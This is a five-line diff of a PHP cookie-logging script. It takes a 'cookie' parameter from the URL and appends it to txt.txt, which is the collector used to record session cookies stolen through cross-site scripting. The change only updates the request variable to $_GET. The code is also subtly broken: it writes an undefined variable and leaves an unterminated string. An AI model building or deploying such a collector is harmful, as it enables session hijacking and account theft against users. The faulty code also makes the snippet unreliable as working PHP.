@@ -1,5 +1,5 @@
 <?php
-$cookie1=$HTTP_GET_VAR["cookie"];
+$cookie1=$_GET["cookie"];
 $file=fopen("txt.txt",'a');
 fwrite($file,$cookie . "\n\n\");
 ?>
